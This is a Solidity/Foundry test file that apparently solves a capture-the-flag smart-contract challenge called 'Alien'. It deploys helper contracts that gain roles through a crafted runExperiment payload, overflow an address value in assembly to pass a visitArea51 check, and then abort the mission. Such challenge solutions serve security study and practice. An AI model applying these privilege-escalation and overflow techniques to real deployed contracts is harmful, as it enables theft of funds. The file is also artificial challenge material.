// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/alien/src/alien.sol";

contract AlientTest is Test {
    Alien alien;

    function setUp() public {
        bytes memory code =
            hex"";
        address targetAddr = makeAddr("target");
        vm.etch(targetAddr, code);
        alien = Alien(targetAddr);
    }

    function _testSolveAlien() public {
        bytes32 captain_role = alien.CAPTAIN();
        bytes32 engineer_role = alien.ENGINEER();
        bytes32 blockchain_security_researcher_role = alien.BLOCKCHAIN_SECURITY_RESEARCHER();
        bytes32 physicist_role = alien.PHYSICIST();

        // console.logBytes32(captain_role);
        // console.logBytes32(engineer_role);
        // console.logBytes32(blockchain_security_researcher_role);
        // console.logBytes32(physicist_role);

        Engineer engineer = new Engineer(address(alien));
        Physicist physicist = new Physicist(address(alien));
        console.log("engineer address: ", address(engineer));
        console.log("physicist address: ", address(physicist));

        alien.applyForJob(engineer_role);

        console.log("is wormhole enabled: ", alien.wormholesEnabled());

        skip(100);

        physicist.applyForCaptainPromotion();

        physicist.ExploitRole();

        console.log("is mission aborted:", alien.missionAborted());
    }
}

contract Engineer {
    Alien alien;

    constructor(address _alien) {
        alien = Alien(_alien);
        alien.applyForJob(alien.ENGINEER());
        bytes memory payload = abi.encodePacked(abi.encodeWithSignature("applyForJob(bytes32)", alien.ENGINEER()));

        alien.runExperiment(payload);
    }
}

contract Physicist {
    Alien alien;

    constructor(address _alien) {
        alien = Alien(_alien);
        alien.applyForJob(alien.PHYSICIST());
        alien.enableWormholes();
    }

    function applyForCaptainPromotion() public {
        alien.applyForPromotion(alien.CAPTAIN());
    }

    function abortMission() public {
        alien.abortMission();
    }

    function jumpThroughWormhole(uint256 x, uint256 y, uint256 z) public {
        string memory result = alien.jumpThroughWormhole(int256(x), int256(y), int256(z)); // <1e24
        console.log(result);
        console.logInt(alien.distance()); //1.53e26
    }

    function ExploitRole() public {
        console.logInt(alien.distance()); // 0
        visitArea51();
        console.logInt(alien.distance());
        string memory result = alien.jumpThroughWormhole(1e23, 1, 1); // <1e24
        console.log(result);
        console.log("payload mass: ", alien.payloadMass());
        //1000000000000000000000000
        //6000000000000000000000000
        console.log("1e24: ", 1e24);
        console.logInt(alien.distance()); //1.53e26

        alien.abortMission();
    }

    function visitArea51() public {
        uint160 myAddress = uint160(address(this));
        uint160 arg = type(uint160).max - myAddress + 52;
        uint160 result;

        assembly {
            result := add(myAddress, arg)
        }
        // we need overflow this address value so final result is 51;
        address target = address(arg);
        alien.visitArea51(target);
    } //5100000e18 = 51e23
}
